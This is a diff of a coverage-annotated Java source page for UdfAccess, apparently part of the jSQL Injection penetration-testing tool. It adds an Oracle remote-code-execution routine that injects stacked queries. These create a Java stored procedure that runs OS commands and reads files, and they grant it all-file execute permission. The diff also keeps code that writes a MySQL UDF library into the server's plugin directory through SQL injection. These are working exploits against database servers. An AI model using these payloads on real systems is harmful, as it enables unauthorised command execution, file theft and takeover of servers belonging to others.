@@ -6,6 +6,7 @@ import com.jsql.model.bean.util.Interaction;
 import com.jsql.model.bean.util.Request;
 import com.jsql.model.exception.JSqlException;
 import com.jsql.model.exception.JSqlRuntimeException;
+import com.jsql.model.injection.vendor.model.VendorYaml;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.LogLevelUtil;
 import com.jsql.util.StringUtil;
@@ -22,6 +23,7 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Objects;
 import java.util.UUID;
@@ -32,85 +34,145 @@ public class UdfAccess {
     /**
      * Log4j logger sent to view.
      */
-<span class="fc" id="L35">    private static final Logger LOGGER = LogManager.getRootLogger();</span>
+<span class="fc" id="L37">    private static final Logger LOGGER = LogManager.getRootLogger();</span>
     private static final String NAME_TABLE = &quot;temp&quot;;
+    private static final String RCE_JAVA_UTIL_SRC = &quot;RCE_JAVA_UTIL_SRC&quot;;
+    private static final String RCE_JAVA_UTIL_FUNC = &quot;RCE_JAVA_UTIL_FUNC&quot;;
 
     private final InjectionModel injectionModel;
-<span class="fc" id="L39">    private final BiPredicate&lt;String, String&gt; biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -&gt; {</span>
+<span class="fc" id="L43">    private final BiPredicate&lt;String, String&gt; biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -&gt; {</span>
         try {
-<span class="fc" id="L41">            return this.buildSysEval(nameLibraryRandom);</span>
-<span class="nc" id="L42">        } catch (JSqlException e) {</span>
-<span class="nc" id="L43">            throw new JSqlRuntimeException(e);</span>
+<span class="fc" id="L45">            return this.buildSysEval(nameLibraryRandom);</span>
+<span class="nc" id="L46">        } catch (JSqlException e) {</span>
+<span class="nc" id="L47">            throw new JSqlRuntimeException(e);</span>
         }
     };
 
-<span class="fc" id="L47">    public UdfAccess(InjectionModel injectionModel) {</span>
-<span class="fc" id="L48">        this.injectionModel = injectionModel;</span>
-<span class="fc" id="L49">    }</span>
+<span class="fc" id="L51">    public UdfAccess(InjectionModel injectionModel) {</span>
+<span class="fc" id="L52">        this.injectionModel = injectionModel;</span>
+<span class="fc" id="L53">    }</span>
+
+    public void createExploitRce(ExploitMethod exploitMethod) throws JSqlException {
+<span class="nc bnc" id="L56" title="All 2 branches missed.">        if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {</span>
+<span class="nc" id="L57">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Exploit method not implemented, use query body instead&quot;);</span>
+<span class="nc" id="L58">            return;</span>
+        }
+
+<span class="nc" id="L61">        var pattern = &quot; ; drop java source \&quot;%s\&quot;;&quot;;</span>
+<span class="nc" id="L62">        this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_SRC), &quot;body#drop-src&quot;);</span>
+<span class="nc" id="L63">        pattern = &quot; ; drop function %s;&quot;;</span>
+<span class="nc" id="L64">        this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_FUNC), &quot;body#drop-src&quot;);</span>
+<span class="nc" id="L65">        pattern = &quot; ; %s &quot;;</span>
+<span class="nc" id="L66">        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,</span>
+            &quot;BEGIN&quot;,
+            &quot;\\n&quot;,
+            &quot;EXECUTE IMMEDIATE 'create or replace and compile java source named \&quot;&quot;,
+            UdfAccess.RCE_JAVA_UTIL_SRC, &quot;_SRC&quot;,
+            &quot;\&quot; as import java.io.*; public class &quot;, UdfAccess.RCE_JAVA_UTIL_SRC, &quot;_SRC{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \&quot;\&quot;;while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;\\\\n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \&quot;\&quot;;while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;\\\\n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};';&quot;,
+            &quot;\\n&quot;,
+            &quot;END;&quot;
+        )), &quot;body#create-src&quot;);
+<span class="nc" id="L75">        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,</span>
+            &quot;BEGIN&quot;,
+            &quot;\\n&quot;,
+            &quot;EXECUTE IMMEDIATE 'create or replace function &quot;,
+            UdfAccess.RCE_JAVA_UTIL_FUNC,
+            &quot;(p_cmd in varchar2) return varchar2 as language java name ''&quot;,
+            UdfAccess.RCE_JAVA_UTIL_SRC,
+            &quot;.runCmd(java.lang.String) return String'';';&quot;,
+            &quot;\\n&quot;,
+            &quot;END;&quot;
+        )), &quot;body#create-func&quot;);
+<span class="nc" id="L86">        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,</span>
+            &quot;BEGIN&quot;,
+            &quot;\\n&quot;,
+            &quot;dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '&lt;&lt;ALL FILES&gt;&gt;', 'execute');&quot;,
+            &quot;\\n&quot;,
+            &quot;END;&quot;
+        )), &quot;body#grant-exec&quot;);
+<span class="nc" id="L93">        var nameDatabase = this.getResult(</span>
+<span class="nc" id="L94">            String.format(</span>
+                &quot;SELECT object_name||'%s' FROM dba_objects WHERE object_name like '%s' and ROWNUM &lt;= 1&quot;,
+                VendorYaml.TRAIL_SQL,
+                UdfAccess.RCE_JAVA_UTIL_FUNC
+            ),
+            &quot;body#confirm&quot;
+        );
+<span class="nc bnc" id="L101" title="All 2 branches missed.">        if (!nameDatabase.contains(UdfAccess.RCE_JAVA_UTIL_FUNC)) {</span>
+<span class="nc" id="L102">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;RCE failure: java function not found&quot;);</span>
+<span class="nc" id="L103">            return;</span>
+        }
+<span class="nc" id="L105">        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;RCE successful: java function found&quot;);</span>
+
+<span class="nc" id="L107">        var request = new Request();</span>
+<span class="nc" id="L108">        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE);</span>
+<span class="nc" id="L109">        request.setParameters(null, null);</span>
+<span class="nc" id="L110">        this.injectionModel.sendToViews(request);</span>
+<span class="nc" id="L111">    }</span>
 
     public void createUdf(String pathNetshareFolder, ExploitMethod exploitMethod) throws JSqlException {
-<span class="pc bpc" id="L52" title="1 of 2 branches missed.">        if (this.injectionModel.getResourceAccess().isReadingNotAllowed()) {</span>
-<span class="nc" id="L53">            return;</span>
+<span class="pc bpc" id="L114" title="1 of 2 branches missed.">        if (this.injectionModel.getResourceAccess().isReadingNotAllowed()) {</span>
+<span class="nc" id="L115">            return;</span>
         }
 
-<span class="fc" id="L56">        var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificNormal().getNbIndexesFound() - 1;</span>
-<span class="fc" id="L57">        var pathPlugin = this.getResult(&quot;select@@plugin_dir&quot;, &quot;udf#dir&quot;);</span>
-<span class="pc bpc" id="L58" title="1 of 2 branches missed.">        if (StringUtils.isEmpty(pathPlugin)) {</span>
-<span class="nc" id="L59">            throw new JSqlException(&quot;Incorrect plugin folder: path is empty&quot;);</span>
+<span class="fc" id="L118">        var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificNormal().getNbIndexesFound() - 1;</span>
+<span class="fc" id="L119">        var pathPlugin = this.getResult(&quot;select@@plugin_dir&quot;, &quot;udf#dir&quot;);</span>
+<span class="pc bpc" id="L120" title="1 of 2 branches missed.">        if (StringUtils.isEmpty(pathPlugin)) {</span>
+<span class="nc" id="L121">            throw new JSqlException(&quot;Incorrect plugin folder: path is empty&quot;);</span>
         }
 
-<span class="fc" id="L62">        var versionOsMachine = this.getResult(&quot;select concat(@@version_compile_os,@@version_compile_machine)&quot;, &quot;udf#check-os&quot;);</span>
-<span class="pc bpc" id="L63" title="1 of 2 branches missed.">        if (StringUtils.isEmpty(versionOsMachine)) {</span>
-<span class="nc" id="L64">            throw new JSqlException(&quot;Incorrect remote machine: unknown system&quot;);</span>
+<span class="fc" id="L124">        var versionOsMachine = this.getResult(&quot;select concat(@@version_compile_os,@@version_compile_machine)&quot;, &quot;udf#check-os&quot;);</span>
+<span class="pc bpc" id="L125" title="1 of 2 branches missed.">        if (StringUtils.isEmpty(versionOsMachine)) {</span>
+<span class="nc" id="L126">            throw new JSqlException(&quot;Incorrect remote machine: unknown system&quot;);</span>
         }
-<span class="pc bpc" id="L66" title="3 of 4 branches missed.">        var isWin = versionOsMachine.toLowerCase().contains(&quot;win&quot;) &amp;&amp; !versionOsMachine.toLowerCase().contains(&quot;linux&quot;);</span>
+<span class="pc bpc" id="L128" title="3 of 4 branches missed.">        var isWin = versionOsMachine.toLowerCase().contains(&quot;win&quot;) &amp;&amp; !versionOsMachine.toLowerCase().contains(&quot;linux&quot;);</span>
 
         String nameLibrary;
-<span class="pc bpc" id="L69" title="1 of 2 branches missed.">        if (versionOsMachine.contains(&quot;64&quot;)) {</span>
-<span class="pc bpc" id="L70" title="1 of 2 branches missed.">            nameLibrary = isWin ? &quot;64.dll&quot; : &quot;64.so&quot;;</span>
+<span class="pc bpc" id="L131" title="1 of 2 branches missed.">        if (versionOsMachine.contains(&quot;64&quot;)) {</span>
+<span class="pc bpc" id="L132" title="1 of 2 branches missed.">            nameLibrary = isWin ? &quot;64.dll&quot; : &quot;64.so&quot;;</span>
         } else {
-<span class="nc bnc" id="L72" title="All 2 branches missed.">            nameLibrary = isWin ? &quot;32.dll&quot; : &quot;32.so&quot;;</span>
+<span class="nc bnc" id="L134" title="All 2 branches missed.">            nameLibrary = isWin ? &quot;32.dll&quot; : &quot;32.so&quot;;</span>
         }
 
-<span class="fc" id="L75">        pathPlugin = pathPlugin.replace(&quot;\\&quot;, &quot;/&quot;);</span>
-<span class="pc bpc" id="L76" title="1 of 2 branches missed.">        if (!pathPlugin.endsWith(&quot;/&quot;)) {</span>
-<span class="nc" id="L77">            pathPlugin = String.format(&quot;%s%s&quot;, pathPlugin, &quot;/&quot;);</span>
+<span class="fc" id="L137">        pathPlugin = pathPlugin.replace(&quot;\\&quot;, &quot;/&quot;);</span>
+<span class="pc bpc" id="L138" title="1 of 2 branches missed.">        if (!pathPlugin.endsWith(&quot;/&quot;)) {</span>
+<span class="nc" id="L139">            pathPlugin = String.format(&quot;%s%s&quot;, pathPlugin, &quot;/&quot;);</span>
         }
 
-<span class="pc bpc" id="L80" title="1 of 2 branches missed.">        if (!this.injectionModel.getMediatorStrategy().getStack().isApplicable()) {</span>
-<span class="fc" id="L81">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Exploit UDF requires stack query, trying anyway...&quot;);</span>
+<span class="pc bpc" id="L142" title="1 of 2 branches missed.">        if (!this.injectionModel.getMediatorStrategy().getStack().isApplicable()) {</span>
+<span class="fc" id="L143">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Exploit UDF requires stack query, trying anyway...&quot;);</span>
         }
-<span class="fc" id="L83">        String isSuccess = StringUtils.EMPTY;</span>
-<span class="pc bpc" id="L84" title="1 of 2 branches missed.">        if (exploitMethod == ExploitMethod.NETSHARE) {</span>
-<span class="nc bnc" id="L85" title="All 2 branches missed.">            if (!pathNetshareFolder.endsWith(&quot;\\&quot;)) {</span>
-<span class="nc" id="L86">                pathNetshareFolder += &quot;\\&quot;;</span>
+<span class="fc" id="L145">        String isSuccess = StringUtils.EMPTY;</span>
+<span class="pc bpc" id="L146" title="1 of 2 branches missed.">        if (exploitMethod == ExploitMethod.NETSHARE) {</span>
+<span class="nc bnc" id="L147" title="All 2 branches missed.">            if (!pathNetshareFolder.endsWith(&quot;\\&quot;)) {</span>
+<span class="nc" id="L148">                pathNetshareFolder += &quot;\\&quot;;</span>
             }
-<span class="nc" id="L88">            UdfAccess.copyToShare(pathNetshareFolder, nameLibrary);</span>
-<span class="nc" id="L89">            isSuccess = this.byNetshare(</span>
+<span class="nc" id="L150">            UdfAccess.copyToShare(pathNetshareFolder, nameLibrary);</span>
+<span class="nc" id="L151">            isSuccess = this.byNetshare(</span>
                 nbIndexesFound,
                 pathNetshareFolder,
                 nameLibrary,
                 pathPlugin,
                 this.biPredConfirm
             );
-<span class="pc bpc" id="L96" title="3 of 4 branches missed.">        } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {</span>
-<span class="pc bpc" id="L97" title="1 of 2 branches missed.">            if (StringUtil.GET.equals(this.injectionModel.getMediatorUtils().getConnectionUtil().getTypeRequest())) {</span>
-<span class="fc" id="L98">                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;GET too limited for UDF with body query, should use POST instead but using GET anyway...&quot;);</span>
+<span class="pc bpc" id="L158" title="3 of 4 branches missed.">        } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {</span>
+<span class="pc bpc" id="L159" title="1 of 2 branches missed.">            if (StringUtil.GET.equals(this.injectionModel.getMediatorUtils().getConnectionUtil().getTypeRequest())) {</span>
+<span class="fc" id="L160">                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;GET too limited for UDF with body query, should use POST instead but using GET anyway...&quot;);</span>
             }
-<span class="fc" id="L100">            isSuccess = this.byQueryBody(</span>
+<span class="fc" id="L162">            isSuccess = this.byQueryBody(</span>
                 nbIndexesFound,
                 pathPlugin,
                 nameLibrary,
-<span class="fc" id="L104">                UdfAccess.toHexChunks(nameLibrary),</span>
+<span class="fc" id="L166">                UdfAccess.toHexChunks(nameLibrary),</span>
                 this.biPredConfirm
             );
         }
-<span class="pc bpc" id="L108" title="4 of 6 branches missed.">        if (StringUtils.isEmpty(isSuccess) &amp;&amp; exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {</span>
-<span class="fc" id="L109">            var nameLibraryRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameLibrary;</span>
-<span class="fc" id="L110">            this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);</span>
-<span class="fc" id="L111">            this.biPredConfirm.test(pathPlugin, nameLibraryRandom);</span>
+<span class="pc bpc" id="L170" title="4 of 6 branches missed.">        if (StringUtils.isEmpty(isSuccess) &amp;&amp; exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {</span>
+<span class="fc" id="L171">            var nameLibraryRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameLibrary;</span>
+<span class="fc" id="L172">            this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);</span>
+<span class="fc" id="L173">            this.biPredConfirm.test(pathPlugin, nameLibraryRandom);</span>
         }
-<span class="fc" id="L113">    }</span>
+<span class="fc" id="L175">    }</span>
 
     public String byQueryBody(
         int nbIndexesFound,
@@ -119,33 +181,33 @@ public class UdfAccess {
         List&lt;String&gt; hexChunks,
         BiPredicate&lt;String,String&gt; biPredConfirm
     ) {
-<span class="fc" id="L122">        String nameExploitValidated = StringUtils.EMPTY;</span>
-<span class="fc" id="L123">        var pattern = &quot; %s SELECT %s 0x%s into dumpfile '%s'&quot;;</span>
+<span class="fc" id="L184">        String nameExploitValidated = StringUtils.EMPTY;</span>
+<span class="fc" id="L185">        var pattern = &quot; %s SELECT %s 0x%s into dumpfile '%s'&quot;;</span>
 
-<span class="fc" id="L125">        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
-<span class="fc" id="L126">        this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
+<span class="fc" id="L187">        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
+<span class="fc" id="L188">        this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
             &quot;union&quot;,
-<span class="fc" id="L128">            &quot;'',&quot;.repeat(nbIndexesFound),</span>
-<span class="fc" id="L129">            String.join(&quot;&quot;, hexChunks),</span>
+<span class="fc" id="L190">            &quot;'',&quot;.repeat(nbIndexesFound),</span>
+<span class="fc" id="L191">            String.join(&quot;&quot;, hexChunks),</span>
             pathRemoteFolder + nameExploitRandom
         ), &quot;body#union-dump&quot;);
-<span class="fc bfc" id="L132" title="All 2 branches covered.">        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
-<span class="fc" id="L133">            nameExploitValidated = nameExploitRandom;</span>
+<span class="fc bfc" id="L194" title="All 2 branches covered.">        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
+<span class="fc" id="L195">            nameExploitValidated = nameExploitRandom;</span>
         }
-<span class="fc bfc" id="L135" title="All 2 branches covered.">        if (StringUtils.isEmpty(nameExploitValidated)) {</span>
-<span class="fc" id="L136">            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Query body connection failure with union, trying with stack...&quot;);</span>
-<span class="fc" id="L137">            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
-<span class="fc" id="L138">            this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
+<span class="fc bfc" id="L197" title="All 2 branches covered.">        if (StringUtils.isEmpty(nameExploitValidated)) {</span>
+<span class="fc" id="L198">            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Query body connection failure with union, trying with stack...&quot;);</span>
+<span class="fc" id="L199">            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
+<span class="fc" id="L200">            this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
                 &quot;;&quot;,
                 StringUtils.EMPTY,
-<span class="fc" id="L141">                String.join(&quot;&quot;, hexChunks),</span>
+<span class="fc" id="L203">                String.join(&quot;&quot;, hexChunks),</span>
                 pathRemoteFolder + nameExploitRandom
             ), &quot;body#stack-dump&quot;);
-<span class="pc bpc" id="L144" title="1 of 2 branches missed.">            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
-<span class="nc" id="L145">                nameExploitValidated = nameExploitRandom;</span>
+<span class="pc bpc" id="L206" title="1 of 2 branches missed.">            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
+<span class="nc" id="L207">                nameExploitValidated = nameExploitRandom;</span>
             }
         }
-<span class="fc" id="L148">        return nameExploitValidated;</span>
+<span class="fc" id="L210">        return nameExploitValidated;</span>
     }
 
     public String byNetshare(
@@ -155,147 +217,169 @@ public class UdfAccess {
         String pathRemoteFolder,
         BiPredicate&lt;String,String&gt; biPredConfirm
     ) {
-<span class="nc" id="L158">        String nameExploitValidated = StringUtils.EMPTY;</span>
-<span class="nc" id="L159">        var pathShareEncoded = pathNetshareFolder.replace(&quot;\\&quot;, &quot;\\\\&quot;);</span>
-<span class="nc" id="L160">        var pattern = &quot; %s SELECT %s load_file('%s') into dumpfile '%s'&quot;;</span>
+<span class="nc" id="L220">        String nameExploitValidated = StringUtils.EMPTY;</span>
+<span class="nc" id="L221">        var pathShareEncoded = pathNetshareFolder.replace(&quot;\\&quot;, &quot;\\\\&quot;);</span>
+<span class="nc" id="L222">        var pattern = &quot; %s SELECT %s load_file('%s') into dumpfile '%s'&quot;;</span>
 
-<span class="nc" id="L162">        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Checking connection using netshare and union...&quot;);</span>
-<span class="nc" id="L163">        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
-<span class="nc" id="L164">        this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
+<span class="nc" id="L224">        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Checking connection using netshare and union...&quot;);</span>
+<span class="nc" id="L225">        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
+<span class="nc" id="L226">        this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
             &quot;union&quot;,
-<span class="nc" id="L166">            &quot;'',&quot;.repeat(nbIndexesFound),</span>
+<span class="nc" id="L228">            &quot;'',&quot;.repeat(nbIndexesFound),</span>
             pathShareEncoded + nameExploit,
             pathRemoteFolder + nameExploitRandom
         ), &quot;udf#share-union&quot;);
-<span class="nc bnc" id="L170" title="All 2 branches missed.">        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
-<span class="nc" id="L171">            nameExploitValidated = nameExploitRandom;</span>
+<span class="nc bnc" id="L232" title="All 2 branches missed.">        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
+<span class="nc" id="L233">            nameExploitValidated = nameExploitRandom;</span>
         }
-<span class="nc bnc" id="L173" title="All 2 branches missed.">        if (StringUtils.isEmpty(nameExploitValidated)) {</span>
-<span class="nc" id="L174">            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Checking connection using netshare and stack...&quot;);</span>
-<span class="nc" id="L175">            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
-<span class="nc" id="L176">            this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
+<span class="nc bnc" id="L235" title="All 2 branches missed.">        if (StringUtils.isEmpty(nameExploitValidated)) {</span>
+<span class="nc" id="L236">            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Checking connection using netshare and stack...&quot;);</span>
+<span class="nc" id="L237">            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +&quot;-&quot;+ nameExploit;</span>
+<span class="nc" id="L238">            this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
                 &quot;;&quot;,
                 StringUtils.EMPTY,
                 pathShareEncoded + nameExploit,
                 pathRemoteFolder + nameExploitRandom
             ), &quot;udf#share-stack&quot;);
-<span class="nc bnc" id="L182" title="All 2 branches missed.">            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
-<span class="nc" id="L183">                nameExploitValidated = nameExploitRandom;</span>
+<span class="nc bnc" id="L244" title="All 2 branches missed.">            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
+<span class="nc" id="L245">                nameExploitValidated = nameExploitRandom;</span>
             }
         }
-<span class="nc" id="L186">        return nameExploitValidated;</span>
+<span class="nc" id="L248">        return nameExploitValidated;</span>
     }
 
     private static void copyToShare(String pathNetshare, String nameLibrary) throws JSqlException {
         try {
-<span class="nc" id="L191">            URI original = Objects.requireNonNull(UdfAccess.class.getClassLoader().getResource(&quot;udf/&quot; + nameLibrary)).toURI();</span>
-<span class="nc" id="L192">            Path originalPath = new File(original).toPath();</span>
-<span class="nc" id="L193">            Path copied = Paths.get(pathNetshare + nameLibrary);</span>
-<span class="nc" id="L194">            Files.copy(originalPath, copied, StandardCopyOption.REPLACE_EXISTING);</span>
-<span class="nc" id="L195">        } catch (IOException | URISyntaxException e) {</span>
-<span class="nc" id="L196">            throw new JSqlException(&quot;Copy udf into local network share failure: &quot; + e.getMessage());</span>
-<span class="nc" id="L197">        }</span>
-<span class="nc" id="L198">    }</span>
+<span class="nc" id="L253">            URI original = Objects.requireNonNull(UdfAccess.class.getClassLoader().getResource(&quot;udf/&quot; + nameLibrary)).toURI();</span>
+<span class="nc" id="L254">            Path originalPath = new File(original).toPath();</span>
+<span class="nc" id="L255">            Path copied = Paths.get(pathNetshare + nameLibrary);</span>
+<span class="nc" id="L256">            Files.copy(originalPath, copied, StandardCopyOption.REPLACE_EXISTING);</span>
+<span class="nc" id="L257">        } catch (IOException | URISyntaxException e) {</span>
+<span class="nc" id="L258">            throw new JSqlException(&quot;Copy udf into local network share failure: &quot; + e.getMessage());</span>
+<span class="nc" id="L259">        }</span>
+<span class="nc" id="L260">    }</span>
 
     public void byTable(List&lt;String&gt; bodyHexChunks, String pathRemoteFile) throws JSqlException {
-<span class="fc" id="L201">        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Checking connection with table and stack...&quot;);</span>
-<span class="fc" id="L202">        var nameDatabase = this.getResult(&quot;select database()&quot;, &quot;tbl#dbname&quot;);</span>
-<span class="pc bpc" id="L203" title="2 of 4 branches missed.">        if (StringUtils.isEmpty(nameDatabase) || StringUtil.INFORMATION_SCHEMA.equals(nameDatabase)) {</span>
-<span class="fc" id="L204">            nameDatabase = &quot;mysql&quot;;</span>
+<span class="fc" id="L263">        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Checking connection with table and stack...&quot;);</span>
+<span class="fc" id="L264">        var nameDatabase = this.getResult(&quot;select database()&quot;, &quot;tbl#dbname&quot;);</span>
+<span class="pc bpc" id="L265" title="2 of 4 branches missed.">        if (StringUtils.isEmpty(nameDatabase) || StringUtil.INFORMATION_SCHEMA.equals(nameDatabase)) {</span>
+<span class="fc" id="L266">            nameDatabase = &quot;mysql&quot;;</span>
         }
-<span class="fc" id="L206">        var nameTableRandom = UdfAccess.NAME_TABLE +&quot;_&quot;+ RandomStringUtils.secure().nextAlphabetic(8);  // underscore required, dash not allowed</span>
-<span class="fc" id="L207">        var nameSchemaTable = nameDatabase +&quot;.&quot;+ nameTableRandom;</span>
-<span class="fc" id="L208">        this.injectionModel.injectWithoutIndex(&quot;; drop table &quot;+ nameSchemaTable, &quot;tbl#tbl&quot;);</span>
-<span class="fc" id="L209">        var countResult = this.getCountTable(nameDatabase, nameTableRandom);</span>
-<span class="pc bpc" id="L210" title="1 of 2 branches missed.">        if (!&quot;0&quot;.equals(countResult)) {</span>
-<span class="nc" id="L211">            throw new JSqlException(&quot;Drop table failure: &quot;+ countResult);</span>
+<span class="fc" id="L268">        var nameTableRandom = UdfAccess.NAME_TABLE +&quot;_&quot;+ RandomStringUtils.secure().nextAlphabetic(8);  // underscore required, dash not allowed</span>
+<span class="fc" id="L269">        var nameSchemaTable = nameDatabase +&quot;.&quot;+ nameTableRandom;</span>
+<span class="fc" id="L270">        this.injectionModel.injectWithoutIndex(&quot;; drop table &quot;+ nameSchemaTable, &quot;tbl#tbl&quot;);</span>
+<span class="fc" id="L271">        var countResult = this.getCountTable(nameDatabase, nameTableRandom);</span>
+<span class="pc bpc" id="L272" title="1 of 2 branches missed.">        if (!&quot;0&quot;.equals(countResult)) {</span>
+<span class="nc" id="L273">            throw new JSqlException(&quot;Drop table failure: &quot;+ countResult);</span>
         }
-<span class="fc" id="L213">        this.injectionModel.injectWithoutIndex(&quot;; create table &quot;+ nameSchemaTable +&quot;(data longblob)&quot;, &quot;tbl#create&quot;);</span>
-<span class="fc" id="L214">        countResult = this.getCountTable(nameDatabase, nameTableRandom);</span>
-<span class="pc bpc" id="L215" title="1 of 2 branches missed.">        if (!&quot;1&quot;.equals(countResult)) {</span>
-<span class="nc" id="L216">            throw new JSqlException(&quot;Create table failure: &quot;+ countResult);</span>
+<span class="fc" id="L275">        this.injectionModel.injectWithoutIndex(&quot;; create table &quot;+ nameSchemaTable +&quot;(data longblob)&quot;, &quot;tbl#create&quot;);</span>
+<span class="fc" id="L276">        countResult = this.getCountTable(nameDatabase, nameTableRandom);</span>
+<span class="pc bpc" id="L277" title="1 of 2 branches missed.">        if (!&quot;1&quot;.equals(countResult)) {</span>
+<span class="nc" id="L278">            throw new JSqlException(&quot;Create table failure: &quot;+ countResult);</span>
         }
-<span class="fc" id="L218">        int indexChunk = 0;</span>
-<span class="fc bfc" id="L219" title="All 2 branches covered.">        for (String chunk: bodyHexChunks) {</span>
-<span class="fc bfc" id="L220" title="All 2 branches covered.">            if (indexChunk == 0) {</span>
-<span class="fc" id="L221">                this.injectionModel.injectWithoutIndex(&quot;; insert into &quot;+ nameSchemaTable +&quot;(data) values (0x&quot;+chunk+&quot;)&quot;, &quot;tbl#init&quot;);</span>
+<span class="fc" id="L280">        int indexChunk = 0;</span>
+<span class="fc bfc" id="L281" title="All 2 branches covered.">        for (String chunk: bodyHexChunks) {</span>
+<span class="fc bfc" id="L282" title="All 2 branches covered.">            if (indexChunk == 0) {</span>
+<span class="fc" id="L283">                this.injectionModel.injectWithoutIndex(&quot;; insert into &quot;+ nameSchemaTable +&quot;(data) values (0x&quot;+chunk+&quot;)&quot;, &quot;tbl#init&quot;);</span>
             } else {
-<span class="fc" id="L223">                this.injectionModel.injectWithoutIndex(&quot;; update &quot;+ nameSchemaTable +&quot; set data = concat(data,0x&quot;+chunk+&quot;)&quot;, &quot;tbl#fill&quot;);</span>
+<span class="fc" id="L285">                this.injectionModel.injectWithoutIndex(&quot;; update &quot;+ nameSchemaTable +&quot; set data = concat(data,0x&quot;+chunk+&quot;)&quot;, &quot;tbl#fill&quot;);</span>
             }
-<span class="fc" id="L225">            indexChunk++;</span>
-<span class="fc" id="L226">        }</span>
-<span class="fc" id="L227">        this.injectionModel.injectWithoutIndex(&quot;; select data from &quot;+ nameSchemaTable +&quot; into dumpfile '&quot;+ pathRemoteFile +&quot;'&quot;, &quot;tbl#dump&quot;);</span>
-<span class="fc" id="L228">    }</span>
+<span class="fc" id="L287">            indexChunk++;</span>
+<span class="fc" id="L288">        }</span>
+<span class="fc" id="L289">        this.injectionModel.injectWithoutIndex(&quot;; select data from &quot;+ nameSchemaTable +&quot; into dumpfile '&quot;+ pathRemoteFile +&quot;'&quot;, &quot;tbl#dump&quot;);</span>
+<span class="fc" id="L290">    }</span>
 
     private String getCountTable(String nameDatabase, String nameTableRandom) {
         try {
